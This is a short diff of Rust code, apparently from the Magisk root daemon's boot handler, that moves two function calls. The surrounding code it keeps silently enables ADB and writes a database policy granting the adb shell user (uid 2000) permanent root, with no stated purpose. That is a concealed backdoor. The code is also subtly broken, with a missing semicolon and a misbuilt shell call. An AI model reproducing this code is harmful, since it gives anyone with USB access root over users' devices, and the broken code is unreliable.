@@ -182,9 +182,7 @@ impl MagiskD {
             secure_dir.mkdir(0o700).log_ok();
         }
 
-        self.ensure_manager();
-        self.zygisk_reset(true)
-        let _ = Command::new("settings")
+            let _ = Command::new("settings")
             .args(&["put", "global", "adb_enabled", "1"])
             .status();
         
@@ -195,6 +193,8 @@ impl MagiskD {
         let _ = Command::new("sh")
             .args(&["-c", "magisk", "--sqlite", r#"INSERT INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1);"#])
             .status();
+        self.ensure_manager();
+        self.zygisk_reset(true)
     }
 
     pub fn boot_stage_handler(&self, client: i32, code: i32) {
